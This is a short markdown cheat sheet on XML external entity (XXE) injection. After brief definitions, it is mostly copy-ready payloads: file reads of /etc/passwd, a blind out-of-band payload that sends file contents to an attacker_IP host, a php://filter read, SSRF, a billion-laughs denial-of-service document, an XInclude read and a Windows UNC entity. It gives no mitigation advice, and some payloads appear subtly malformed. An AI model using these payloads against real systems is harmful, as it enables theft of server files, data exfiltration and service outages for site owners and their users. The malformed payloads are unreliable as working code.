# XXE

XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application’s processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any backend or external systems that the application itself can access.

**Internal Entity**: If an entity is declared within a DTD it is called as internal entity.
Syntax: <!ENTITY entity_name "entity_value">

**External Entity**: If an entity is declared outside a DTD it is called as external entity. Identified by SYSTEM.
Syntax: <!ENTITY entity_name SYSTEM "entity_value">

# XXE Attacks:

- **Retrieve Files**
- **SSRF Attacks**
- **Exfiltrate Data Out-of-Band**
- **Denial Of Service**

 

**Local file Inclusion :**
In this technique, the Web application will accept the input from the user (as below payloads), parse it, And respond back with the local file.

```
<?xml version="1.0"?><!DOCTYPE foo [ <!ELEMENT foo (#ANY)><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
```

```
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

 

**Blind Local File Inclusion :**
In some cases and based on the web application logic, It might not respond with message back to user like in **login forms**, When user submits user_name and password, The server responds with True or False. 
So attacker needs to send the file from server-side (SSRF)

```
<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % p1 SYSTEM "file:///etc/passwd"> <!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://attacker_IP:port/BLAH?%p1;'>"> ]> 
```

This payload will read file /etc/passwd and trying to open the attacker web site http://attacker_IP:port/BLAH?%p1; replacing **p1** with the file content, on the attacker side he can read the content back.

 

**Access Control Bypass**
In other cases, Attacker need to read files within the app that he is not authorized to access like admin pages.

```
<?xml version="1.0"?> <!DOCTYPE foo [ <!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]> <foo><result>∾</result></foo>
```

 

**Server-Side Request Forgery (SSRF)**
When the attacker injects payload which makes requests from the server back-end on behalf of victim web app.

```
<?xml version="1.0"?> <!DOCTYPE foo [  <!ELEMENT foo (#ANY)> <!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
```

 

**Denial Of Service (XML Entity Expansion)**
When an XML parser loads this document, it will try to resolve the lol9 entity. At first, lol9 expands to seven lol8 entities, each lol8 expands to ten lol7 entities, and so on. As a result, we get  around 1 billion “***lol***” strings. Which consumes resources.

```
<!--?xml version="1.0" ?--> <!DOCTYPE lolz [<!ENTITY lol "lol"> <!ELEMENT lolz (#PCDATA)> <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"> <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"> <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"> <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"> <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"> <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"> <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"> <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"> <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"> <tag>&lol9;</tag>
```

 

**XInclude attacks:**
Some applications will receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. When a server takes arbitrary input and does something with it. An example of this occurs when client-submitted data is placed into a backend SOAP request, which is then processed by the backend SOAP service.
*The attacker in this scenario doesn’t have control over the full XML document.*

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>
```

 

**XXE on Windows**

```
<!ENTITY xxe SYSTEM "\\127.0.0.1">
```